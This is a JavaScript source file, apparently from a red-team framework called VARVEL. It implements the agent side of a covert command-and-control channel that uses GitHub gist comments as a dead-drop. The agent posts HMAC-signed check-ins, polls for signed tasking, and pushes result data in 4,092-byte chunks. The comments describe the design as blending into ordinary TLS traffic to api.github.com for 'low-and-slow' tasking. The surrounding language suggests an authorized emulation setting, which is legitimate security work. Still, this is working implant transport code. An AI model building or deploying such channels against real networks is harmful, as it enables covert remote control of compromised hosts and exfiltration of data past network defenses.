// VARVEL — agent-side GitHub dead-drop transport ('ghc') for the governed callback channel.
//
// The agent's half of the cloud/SaaS C2 rung (engine/ghc2.mjs is the codec + REST client,
// the channel-side pump lives in callback.mjs). From the target network's chair the
// check-in is TLS to api.github.com — ordinary SaaS egress, 443-only friendly, no VARVEL
// listener anywhere on the wire. The gist is the dead-drop; comments are the mailbox.
//
// SAME governance contract as DnsTransport: strictly-increasing seq, per-message HMAC,
// chunked push with per-chunk authentication — and one MORE layer the dns wires don't
// have: the channel's tasking is SIGN-CHECKED agent-side (down envelopes carry
// HMAC(token, 'ghc-down:'+a+':'+p)); a leaked gist URL never lets a reader task us.
//
// RATE REALITY (agent side): a pull = 1 POST + ≥1 list; a push = 1 POST per 4,092-byte
// chunk. The authenticated budget is 5,000 req/hr per token and BOTH sides spend from it
// (channel polls too) — this transport is for low-and-slow tasking, never interactive
// shells. Cadence lives in the sim-agent's interval/jitter (60s+ recommended; the
// channel-side poll default is ghc2.intervalSec=60).

import { pullPayload, pushPayloads, wrapEnvelope, downsFromComments, decodeReply, decodeReplyEnc, GHC2_RATE } from '../engine/ghc2.mjs';

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

export class Ghc2Transport {
  // api: a Ghc2Api (engine/ghc2.mjs) pointed at the mailbox gist — injectable apiBase for
  // tests. replyWaitMs/replyPollMs: how long/how often to watch for the channel's signed
  // down-comment after posting a check-in. Defaults assume the channel polls at 60s:
  // two full channel cadences plus slack. Never throws; failure reads as idle.
  // enc:true = the engine/envelope layer: sealed push content + REQUIRED sealed task
  // replies (a plaintext reply is a downgrade — counted, consumed, never tasked from).
  constructor({ api, agentId, token, replyWaitMs = 130000, replyPollMs = 5000, enc = false } = {}) {
    if (!api) throw new TypeError('Ghc2Transport: an api client (engine/ghc2 Ghc2Api) is required');
    this.api = api;
    this.agentId = String(agentId || '');
    this.token = String(token || '');
    this.replyWaitMs = Math.max(500, Number(replyWaitMs) || 130000);
    this.replyPollMs = Math.max(100, Number(replyPollMs) || 5000);
    this.seq = 0;
    this._downCursor = 0;
    this.enc = enc === true;
    this.forgedDowns = 0; // down-envelopes addressed to me with a BAD signature (honest count)
    this.plaintextDowns = 0; // enc mode: down-envelopes that arrived UNSEALED (downgrade refusals)
  }

  // Check in: post the governed pull payload as an up-comment, then watch for the
  // channel's signed reply until the wait window closes. Returns the task object or null
  // (idle/denied/timeout — uniform, exactly like DnsTransport.pull). EXACTLY-ONCE: the
  // down cursor advances past a reply ONLY when it is consumed (returned); a reply that
  // arrives after the window stays unread and is picked up by a later pull.
  async pull() {
    const s = ++this.seq;
    const posted = await this.api.createComment(wrapEnvelope({ v: 1, d: 'up', p: pullPayload({ agentId: this.agentId, token: this.token, seq: s, enc: this.enc }) }));
    if (!posted.ok) return null;
    const deadline = Date.now() + this.replyWaitMs;
    for (;;) {
      const res = await this.api.listComments();
      if (res.ok) {
        const { replies, cursor, forged } = downsFromComments(res.comments, this._downCursor, { agentId: this.agentId, token: this.token });
        this.forgedDowns += forged;
        if (replies.length) {
          this._downCursor = replies[0].id; // consume the OLDEST only; later ones stay for next cycles
          // enc: the signed reply must ALSO be sealed — an unsealed (or unopenable)
          // reply is a downgrade/tamper: counted, consumed, never tasked from.
          if (this.enc) {
            const task = decodeReplyEnc(replies[0].replyStr, { agentId: this.agentId, token: this.token });
            if (task === null) this.plaintextDowns++;
            return task;
          }
          return decodeReply(replies[0].replyStr); // null on a malformed reply (consumed, dropped)
        }
        this._downCursor = cursor; // nothing for me: advance past the human/foreign chatter
      }
      if (Date.now() >= deadline) return null;
      await sleep(this.replyPollMs);
    }
  }

  // Push a result body: one up-comment per 4,092-byte chunk (per-chunk HMAC; the shared
  // intake reassembles). Returns true when every chunk posted. Big outputs are the wrong
  // shape for this wire (100 chunks ≈ 400 KB) — artifact staging belongs on http/ws.
  async push(taskId, body) {
    const parts = pushPayloads({ agentId: this.agentId, token: this.token, taskId, body, nextSeq: () => ++this.seq, enc: this.enc });
    let ok = 0;
    for (const p of parts) {
      const r = await this.api.createComment(wrapEnvelope({ v: 1, d: 'up', p }));
      if (r.ok) ok++;
    }
    return ok === parts.length;
  }

  close() { /* stateless — the api client holds no sockets of its own beyond the agents */ }
}

export { GHC2_RATE };
